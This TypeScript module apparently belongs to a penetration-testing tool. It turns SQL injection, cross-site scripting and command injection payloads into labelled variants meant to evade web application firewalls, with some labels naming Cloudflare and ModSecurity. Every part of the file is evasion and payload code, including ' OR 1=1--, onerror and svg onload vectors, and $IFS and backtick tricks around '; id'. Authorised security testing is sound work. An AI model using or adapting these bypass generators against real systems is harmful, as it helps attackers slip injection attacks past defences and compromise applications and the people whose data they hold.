/**
 * Hardcoded WAF bypass variant generators.
 * Given a raw payload string and category, produces 3-5 labeled bypass variants.
 */

export interface WafBypassVariant {
  label: string;
  payload: string;
}

/* ── Encoding helpers ── */
const urlEncode = (s: string) => s.replace(/[<>"'&=;()]/g, (c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`);

const doubleEncode = (s: string) =>
  s.replace(/[<>"'&=;()]/g, (c) => {
    const hex = c.charCodeAt(0).toString(16).toUpperCase();
    return `%25${hex}`;
  });

const insertComments = (s: string, type: "sql" | "html") => {
  if (type === "sql") return s.replace(/\s+(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP)/gi, " /*!$1*/");
  // HTML/JS comment insertion
  return s.replace(/<script/gi, "<scr<!---->ipt").replace(/<\/script/gi, "</scr<!---->ipt");
};

const caseVariation = (s: string) =>
  s.replace(/[a-zA-Z]/g, (c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()));

const whitespaceSubstitution = (s: string) =>
  s.replace(/ /g, (_, i) => ["\t", "%09", "%0a", "/**/", "+"][i % 5]);

const unicodeVariant = (s: string) =>
  s
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/'/g, "\\u0027")
    .replace(/"/g, "\\u0022");

/* ── Category detection ── */
const WAF_CATEGORIES = ["SQLi", "XSS", "Command Injection", "CommandInjection", "RCE"] as const;

type WafCategory = "sqli" | "xss" | "cmdi";

const detectCategory = (category: string, title: string): WafCategory | null => {
  const combined = `${category} ${title}`.toLowerCase();
  if (/sqli|sql.?inject/i.test(combined)) return "sqli";
  if (/xss|cross.?site.?script/i.test(combined)) return "xss";
  if (/command.?inject|rce|remote.?code|cmdi|os.?inject/i.test(combined)) return "cmdi";
  return null;
};

/* ── SQLi bypass variants ── */
const sqliVariants = (payload: string): WafBypassVariant[] => {
  const base = payload || "' OR 1=1--";
  return [
    {
      label: "Cloudflare bypass — inline comments",
      payload: insertComments(base, "sql"),
    },
    {
      label: "ModSecurity bypass — double URL encoding",
      payload: doubleEncode(base),
    },
    {
      label: "Generic WAF bypass — case variation",
      payload: caseVariation(base),
    },
    {
      label: "Generic WAF bypass — whitespace substitution",
      payload: whitespaceSubstitution(base),
    },
    {
      label: "Cloudflare bypass — concat & char bypass",
      payload: base
        .replace(/'([^']+)'/g, "CHAR(39)||$1||CHAR(39)")
        .replace(/UNION SELECT/gi, "/*!UNION*/ /*!SELECT*/"),
    },
  ];
};

/* ── XSS bypass variants ── */
const xssVariants = (payload: string): WafBypassVariant[] => {
  const base = payload || '<script>alert(1)</script>';
  return [
    {
      label: "Cloudflare bypass — event handler alternative",
      payload: '<img src=x onerror="alert(1)">',
    },
    {
      label: "ModSecurity bypass — URL encoded",
      payload: urlEncode(base),
    },
    {
      label: "Generic WAF bypass — SVG/onload vector",
      payload: '<svg/onload=alert(1)>',
    },
    {
      label: "Cloudflare bypass — template literal",
      payload: '<img src=x onerror=alert`1`>',
    },
    {
      label: "Generic WAF bypass — unicode escape",
      payload: unicodeVariant(base),
    },
  ];
};

/* ── Command Injection bypass variants ── */
const cmdiVariants = (payload: string): WafBypassVariant[] => {
  const base = payload || "; id";
  return [
    {
      label: "Cloudflare bypass — newline delimiter",
      payload: base.replace(/;/g, "%0a"),
    },
    {
      label: "ModSecurity bypass — variable concatenation",
      payload: base.replace(/cat /g, "c${IFS}at ").replace(/id/g, "i${IFS}d"),
    },
    {
      label: "Generic WAF bypass — $IFS whitespace",
      payload: base.replace(/ /g, "${IFS}"),
    },
    {
      label: "Generic WAF bypass — backtick substitution",
      payload: base.replace(/id/, "`id`").replace(/whoami/, "`whoami`"),
    },
    {
      label: "Cloudflare bypass — hex-encoded command",
      payload: `$(printf '\\x69\\x64')`,
    },
  ];
};

/* ── Public API ── */
export const getWafBypasses = (
  category: string,
  title: string,
  payloadExample: string
): WafBypassVariant[] | null => {
  const cat = detectCategory(category, title);
  if (!cat) return null;

  switch (cat) {
    case "sqli":
      return sqliVariants(payloadExample);
    case "xss":
      return xssVariants(payloadExample);
    case "cmdi":
      return cmdiVariants(payloadExample);
  }
};

export const hasWafBypasses = (category: string, title: string): boolean =>
  detectCategory(category, title) !== null;
